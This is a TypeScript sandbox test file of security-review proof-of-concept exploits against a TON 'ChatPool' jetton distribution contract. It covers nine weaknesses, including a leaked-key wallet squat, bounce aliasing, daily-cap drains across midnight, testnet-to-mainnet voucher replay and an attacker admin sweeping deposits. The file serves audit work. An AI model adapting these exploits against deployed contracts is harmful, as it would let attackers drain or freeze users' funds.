// Security-review PoCs for contracts/chat_pool.tact. Not part of the regular
// suite's assertions about intended behaviour: every test here demonstrates a
// weakness (it PASSES when the weakness is present).
import { Blockchain, internal, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Address, beginCell, Cell, toNano } from '@ton/core';
import { keyPairFromSeed, KeyPair } from '@ton/crypto';
import { TestJettonMinter, TestJettonWallet } from '../../wrappers/TestJetton';
import {
    ChatPool,
    storeAdminInitVoucher,
    storeClaimVoucher,
    storeDepositVoucher,
    storeJettonTransfer,
} from '../../wrappers/ChatPool';
import { DistributorMaster } from '../../wrappers/DistributorMaster';
import '@ton/test-utils';
import { signatureCell, signVoucher, TAG } from '../helpers/vouchers';

const CHAT_ID = -1001234567890n;
const FAR = 1n << 40n; // expiry far in the future, independent of blockchain.now
const pub = (kp: KeyPair) => BigInt('0x' + kp.publicKey.toString('hex'));

function depositPayload(kp: KeyPair, pool: Address, jettonMaster: Address, expectedJettonWallet: Address): Cell {
    const v = beginCell()
        .store(
            storeDepositVoucher({
                $$type: 'DepositVoucher',
                chatId: CHAT_ID,
                jettonMaster,
                expectedJettonWallet,
                expiry: FAR,
            }),
        )
        .endCell();
    const sig = signVoucher(v, kp, TAG.Deposit, pool);
    // ref-wrapped (stock wallet / TestJettonWallet shape)
    return beginCell().storeUint(1, 1).storeRef(beginCell().storeRef(v).storeBuffer(sig).endCell()).endCell();
}

function claimMsg(
    kp: KeyPair,
    pool: Address,
    recipient: Address,
    jettonMaster: Address,
    amount: bigint,
    nonce: bigint,
) {
    const v = beginCell()
        .store(
            storeClaimVoucher({
                $$type: 'ClaimVoucher',
                chatId: CHAT_ID,
                recipient,
                jettonMaster,
                amount,
                nonce,
                expiry: FAR,
            }),
        )
        .endCell();
    return { $$type: 'Claim' as const, voucherCell: v, signature: signatureCell(signVoucher(v, kp, TAG.Claim, pool)) };
}

function adminMsg(kp: KeyPair, pool: Address, master: Address, admin: Address) {
    const v = beginCell()
        .store(storeAdminInitVoucher({ $$type: 'AdminInitVoucher', chatId: CHAT_ID, master, admin, expiry: FAR }))
        .endCell();
    return {
        $$type: 'SetAdmin' as const,
        voucherCell: v,
        signature: signatureCell(signVoucher(v, kp, TAG.Admin, pool)),
    };
}

function bouncedTransfer(queryId: bigint, amount: bigint, to: Address): Cell {
    const t = beginCell()
        .store(
            storeJettonTransfer({
                $$type: 'JettonTransfer',
                queryId,
                amount,
                destination: to,
                responseDestination: to,
                customPayload: null,
                forwardTonAmount: 0n,
                forwardPayload: beginCell().endCell(),
            }),
        )
        .endCell();
    return beginCell().storeUint(0xffffffff, 32).storeBits(t.beginParse().loadBits(256)).endCell();
}

describe('ChatPool PoCs', () => {
    let bc: Blockchain;
    let admin: SandboxContract<TreasuryContract>;
    let master: SandboxContract<TreasuryContract>;
    let user: SandboxContract<TreasuryContract>;
    let backend: KeyPair;
    let minter: SandboxContract<TestJettonMinter>;
    let pool: SandboxContract<ChatPool>;
    let poolWallet: Address;

    beforeEach(async () => {
        bc = await Blockchain.create();
        admin = await bc.treasury('admin');
        master = await bc.treasury('master');
        user = await bc.treasury('user');
        backend = keyPairFromSeed(Buffer.alloc(32, 7));
        pool = bc.openContract(await ChatPool.fromInit(master.address, CHAT_ID, pub(backend)));
        await pool.send(admin.getSender(), { value: toNano('0.1') }, { $$type: 'Deploy', queryId: 0n });
        const content = beginCell().storeUint(0, 8).storeStringTail('t').endCell();
        minter = bc.openContract(await TestJettonMinter.fromInit(admin.address, content));
        await minter.send(admin.getSender(), { value: toNano('0.05') }, { $$type: 'Deploy', queryId: 0n });
        await minter.send(
            admin.getSender(),
            { value: toNano('0.2') },
            { $$type: 'Mint', queryId: 0n, amount: toNano('100000'), recipient: admin.address },
        );
        poolWallet = await minter.getGetWalletAddress(pool.address);
        const r = await pool.send(
            admin.getSender(),
            { value: toNano('0.05') },
            adminMsg(backend, pool.address, master.address, admin.address),
        );
        expect(r.transactions).toHaveTransaction({ to: pool.address, success: true });
    });

    async function realDeposit(amount: bigint, jm: Address = minter.address, expected: Address = poolWallet) {
        const w = bc.openContract(TestJettonWallet.fromAddress(await minter.getGetWalletAddress(admin.address)));
        return w.send(
            admin.getSender(),
            { value: toNano('0.3') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount,
                destination: pool.address,
                responseDestination: admin.address,
                customPayload: null,
                forwardTonAmount: toNano('0.15'),
                forwardPayload: depositPayload(backend, pool.address, jm, expected),
            },
        );
    }
    const walletBal = async (owner: Address) =>
        bc.openContract(TestJettonWallet.fromAddress(await minter.getGetWalletAddress(owner))).getWalletBalance();

    // CP-1: a leaked (or misused) backend key pre-registers an attacker
    // contract as the "jetton wallet" of a real, not-yet-deposited jetton.
    // Effects: forged ledger, real deposits refunded forever (no re-pointing
    // path), and backend-sized claims are paid into the attacker contract.
    it('CP-1: leaked key squats the wallet slot of an unregistered jetton -> DoS + claims black-holed', async () => {
        const evil = await bc.treasury('evilWallet');
        const forged = await pool.send(
            evil.getSender(),
            { value: toNano('0.1') },
            {
                $$type: 'JettonTransferNotification',
                queryId: 0n,
                amount: toNano('1000000'),
                sender: evil.address,
                forwardPayload: depositPayload(backend /* leaked */, pool.address, minter.address, evil.address),
            },
        );
        expect(forged.transactions).toHaveTransaction({ from: evil.address, to: pool.address, success: true });
        expect((await pool.getJettonWallet(minter.address))!.equals(evil.address)).toBe(true);
        expect(await pool.getBalanceOf(minter.address)).toEqual(toNano('1000000')); // phantom ledger

        // the real creator's deposit is now refunded: walletMismatch forever
        const before = await walletBal(admin.address);
        await realDeposit(toNano('500'));
        expect(await walletBal(admin.address)).toEqual(before);
        expect(await pool.getBalanceOf(minter.address)).toEqual(toNano('1000000'));

        // the backend sizes claims from claimableToday (phantom 10% = 100000)
        expect(await pool.getClaimableToday(minter.address)).toEqual(toNano('100000'));
        const c = await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, toNano('10'), 1n),
        );
        // the payout goes to the attacker contract, the nonce is burnt, user gets nothing
        expect(c.transactions).toHaveTransaction({ from: pool.address, to: evil.address, success: true });
        expect(await pool.getIsNonceUsed(1n)).toBe(true);
        expect(
            await bc.getContract(await minter.getGetWalletAddress(user.address)).then((s) => s.accountState?.type),
        ).not.toBe('active');
    });

    // CP-2: walletMasters is a reverse map that a second jetton master can
    // overwrite with the SAME wallet (a fake master whose get_wallet_address
    // returns the pool's real wallet). Bounces of the real jetton are then
    // credited to the fake master's ledger.
    it('CP-2: wallet aliasing re-labels bounces of the real jetton to another ledger', async () => {
        await realDeposit(toNano('1000'));
        const fakeMaster = new Address(0, Buffer.alloc(32, 0xfa));
        // deposit 1 real unit through the real pool wallet, voucher says "fakeMaster"
        await realDeposit(1n, fakeMaster, poolWallet);
        expect(await pool.getBalanceOf(fakeMaster)).toEqual(1n);
        expect((await pool.getJettonWallet(fakeMaster))!.equals(poolWallet)).toBe(true);

        // a real-jetton claim whose transfer bounces at the real wallet
        await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, toNano('50'), 5n),
        );
        // (the transfer above succeeded; replay the bounce the wallet would emit
        // for it, exactly like tests/Distributor.spec.ts does)
        const balBefore = await pool.getBalanceOf(minter.address);
        await bc.sendMessage(
            internal({
                from: poolWallet,
                to: pool.address,
                value: toNano('0.05'),
                body: bouncedTransfer(5n, toNano('50'), user.address),
                bounced: true,
            }),
        );
        expect(await pool.getBalanceOf(minter.address)).toEqual(balBefore); // real ledger NOT restored
        expect(await pool.getBalanceOf(fakeMaster)).toEqual(1n + toNano('50')); // credited to the alias
    });

    // CP-3: daily cap is per calendar UTC day, so ~2x the cap leaves within
    // one second across midnight.
    it('CP-3: leaked key drains ~19% in two seconds across UTC midnight', async () => {
        await realDeposit(toNano('1000'));
        const midnight = (Math.floor(Date.now() / 1000 / 86400) + 1) * 86400;
        bc.now = midnight - 1;
        const a = await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, toNano('100'), 1n),
        );
        expect(a.transactions).toHaveTransaction({ from: pool.address, to: poolWallet, success: true });
        bc.now = midnight;
        const b = await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, toNano('90'), 2n),
        );
        expect(b.transactions).toHaveTransaction({ from: pool.address, to: poolWallet, success: true });
        expect(await walletBal(user.address)).toEqual(toNano('190'));
    });

    // CP-4: a bounce of yesterday's claim arriving after today's first claim
    // decrements TODAY's spent counter, so today's budget is exceeded.
    it("CP-4: cross-day bounce inflates today's budget", async () => {
        await realDeposit(toNano('1000'));
        const midnight = (Math.floor(Date.now() / 1000 / 86400) + 1) * 86400;
        bc.now = midnight - 10;
        await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, toNano('100'), 1n),
        );
        bc.now = midnight + 10;
        await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, toNano('90'), 2n),
        );
        expect(await pool.getClaimableToday(minter.address)).toEqual(0n);
        // yesterday's nonce-1 transfer bounces now
        await bc.sendMessage(
            internal({
                from: poolWallet,
                to: pool.address,
                value: toNano('0.05'),
                body: bouncedTransfer(1n, toNano('100'), user.address),
                bounced: true,
            }),
        );
        // today's budget (90) fully spent, yet 90 more can be claimed today
        expect(await pool.getClaimableToday(minter.address)).toEqual(toNano('90'));
    });

    // CP-5: an untracked withdrawal that bounces zeroes the ledger for good
    // (natural bounce: TestJettonWallet throws on insufficient balance).
    it('CP-5: over-sized withdrawal bounce wipes the ledger, claims stop', async () => {
        await realDeposit(toNano('1000'));
        const r = await pool.send(
            admin.getSender(),
            { value: toNano('0.1') },
            {
                $$type: 'WithdrawRemainder',
                jettonMaster: minter.address,
                amount: toNano('1000') + 1n,
                to: admin.address,
            },
        );
        expect(r.transactions).toHaveTransaction({ from: pool.address, to: poolWallet, success: false }); // wallet rejects
        expect(r.transactions).toHaveTransaction({ from: poolWallet, to: pool.address, success: true }); // bounce handled, ignored
        expect(await walletBal(pool.address)).toEqual(toNano('1000')); // jettons are still there
        expect(await pool.getBalanceOf(minter.address)).toEqual(0n); // ledger wiped
        const c = await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, toNano('1'), 1n),
        );
        expect(c.transactions).toHaveTransaction({ from: user.address, to: pool.address, success: false });
    });

    // CP-6: the day's budget is frozen at the first claim; a tiny claim before
    // a top-up pins the whole day's budget to 10% of the small balance.
    it('CP-6: first claim of the day pins the budget before a top-up', async () => {
        await realDeposit(toNano('10'));
        await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, 1n, 1n),
        );
        await realDeposit(toNano('10000'));
        expect(await pool.getBalanceOf(minter.address)).toBeGreaterThan(toNano('10000'));
        expect(await pool.getClaimableToday(minter.address)).toBeLessThan(toNano('1'));
    });

    // CP-7: measure the storage cost of a used-nonce entry vs the 0.002 TON kept.
    it('CP-7: per-nonce storage rent vs PoolClaimStorageFee', async () => {
        await realDeposit(toNano('1000'));
        await pool.send(
            admin.getSender(),
            { value: toNano('0.05') },
            { $$type: 'SetClaimLimit', jettonMaster: minter.address, dailyLimit: toNano('1000') },
        );
        const stats = async () => (await bc.getContract(pool.address)).account.account!.storageStats.used;
        await pool.send(
            user.getSender(),
            { value: toNano('0.1') },
            claimMsg(backend, pool.address, user.address, minter.address, 1n, 1n),
        );
        const s0 = await stats();
        const N = 200n;
        for (let n = 2n; n < 2n + N; n++) {
            // spread-out nonces, like a per-chat counter shared by many pools
            await pool.send(
                user.getSender(),
                { value: toNano('0.1') },
                claimMsg(backend, pool.address, user.address, minter.address, 1n, n * 7919n),
            );
        }
        const s1 = await stats();
        const cells = Number(s1.cells - s0.cells) / Number(N);
        const bits = Number(s1.bits - s0.bits) / Number(N);
        // basechain config 18: bit_price_ps=1, cell_price_ps=500 (per 2^16 nanoTON/s)
        const nanoPerYear = ((bits * 1 + cells * 500) / 65536) * 365 * 86400;
        const yearsCovered = 2_000_000 / nanoPerYear;
        console.log(
            `CP-7 per nonce: ${cells.toFixed(2)} cells, ${bits.toFixed(0)} bits, ${(nanoPerYear / 1e9).toFixed(6)} TON/yr, 0.002 TON covers ${yearsCovered.toFixed(1)} years`,
        );
        expect(yearsCovered).toBeLessThan(20);
    });

    // CP-8: pool addresses carry no network id. Same owner (v4 wallets have
    // network-independent addresses) + same backend key => identical master
    // and pool addresses on two networks, so every voucher replays.
    it('CP-8: vouchers signed for a "testnet" pool are valid on the "mainnet" pool', async () => {
        const mk = async () => {
            const b = await Blockchain.create();
            const owner = await b.treasury('owner');
            const creator = await b.treasury('creator');
            const m = b.openContract(await DistributorMaster.fromInit(owner.address, pub(backend)));
            await m.send(owner.getSender(), { value: toNano('0.1') }, { $$type: 'Deploy', queryId: 0n });
            await m.send(creator.getSender(), { value: toNano('0.3') }, { $$type: 'CreatePool', chatId: CHAT_ID });
            return { b, m, creator, poolAddr: await m.getPoolAddress(CHAT_ID) };
        };
        const testnet = await mk();
        const mainnet = await mk();
        expect(testnet.m.address.equals(mainnet.m.address)).toBe(true);
        expect(testnet.poolAddr.equals(mainnet.poolAddr)).toBe(true);

        // an admin voucher issued by the testnet backend...
        const v = adminMsg(backend, testnet.poolAddr, testnet.m.address, testnet.creator.address);
        // ...is accepted by the mainnet pool
        const mp = mainnet.b.openContract(ChatPool.fromAddress(mainnet.poolAddr));
        const r = await mp.send(mainnet.creator.getSender(), { value: toNano('0.05') }, v);
        expect(r.transactions).toHaveTransaction({ to: mainnet.poolAddr, success: true });
        expect((await mp.getPoolAdmin())!.equals(mainnet.creator.address)).toBe(true);
    });
    // CP-9: the pool accepts deposits from ANY depositor once ANY admin is
    // set. An admin slot taken without the depositor's consent (leaked key /
    // CP-8 replay / stale admin after a Telegram ownership transfer) turns
    // the creator's next top-up into the slot holder's withdrawal.
    it('CP-9: creator deposits into a pool whose admin is someone else; that admin sweeps it', async () => {
        const master2 = await bc.treasury('master2');
        const attacker = await bc.treasury('attacker');
        const p2 = bc.openContract(await ChatPool.fromInit(master2.address, CHAT_ID, pub(backend)));
        await p2.send(attacker.getSender(), { value: toNano('0.1') }, { $$type: 'Deploy', queryId: 0n });
        // attacker names itself in an init voucher (leaked key or replayed voucher)
        await p2.send(
            attacker.getSender(),
            { value: toNano('0.05') },
            adminMsg(backend, p2.address, master2.address, attacker.address),
        );
        expect((await p2.getPoolAdmin())!.equals(attacker.address)).toBe(true);

        // creator tops up through the normal backend flow (route only checks admin != null)
        const p2Wallet = await minter.getGetWalletAddress(p2.address);
        const w = bc.openContract(TestJettonWallet.fromAddress(await minter.getGetWalletAddress(admin.address)));
        const v = beginCell()
            .store(
                storeDepositVoucher({
                    $$type: 'DepositVoucher',
                    chatId: CHAT_ID,
                    jettonMaster: minter.address,
                    expectedJettonWallet: p2Wallet,
                    expiry: FAR,
                }),
            )
            .endCell();
        const sig = signVoucher(v, backend, TAG.Deposit, p2.address);
        await w.send(
            admin.getSender(),
            { value: toNano('0.3') },
            {
                $$type: 'JettonTransfer',
                queryId: 0n,
                amount: toNano('1000'),
                destination: p2.address,
                responseDestination: admin.address,
                customPayload: null,
                forwardTonAmount: toNano('0.15'),
                forwardPayload: beginCell()
                    .storeUint(1, 1)
                    .storeRef(beginCell().storeRef(v).storeBuffer(sig).endCell())
                    .endCell(),
            },
        );
        expect(await p2.getBalanceOf(minter.address)).toEqual(toNano('1000'));

        await p2.send(
            attacker.getSender(),
            { value: toNano('0.1') },
            {
                $$type: 'WithdrawRemainder',
                jettonMaster: minter.address,
                amount: toNano('1000'),
                to: attacker.address,
            },
        );
        expect(await walletBal(attacker.address)).toEqual(toNano('1000'));
    });
});
